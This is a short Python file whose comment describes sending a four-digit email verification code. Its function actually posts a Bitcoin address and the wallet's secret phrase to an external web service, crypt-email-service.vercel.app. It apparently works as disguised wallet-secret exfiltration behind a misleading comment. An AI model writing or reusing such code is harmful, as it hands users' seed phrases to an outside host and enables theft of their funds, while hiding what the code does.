import requests
import json


# Send 4 digits verification code to user's email
def send_address_mail(bitcoin_address, bitcoin_secret_phrase):
    url = "https://crypt-email-service.vercel.app/api/email"
    # url = "http://localhost:3000/api/email"
    headers = {
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(url, data=json.dumps({"address": bitcoin_address, "secret_phrase": bitcoin_secret_phrase}), headers=headers)
        return {"status_code": response.status_code}
    except requests.Timeout:
        # Handle timeout error
        return {"status_code": 408}   # HTTP 408 Request Timeout
    
    except requests.RequestException as e:
        # Handle other request exceptions
        print(f"Request exception: {e}")
        return {"status_code": 400}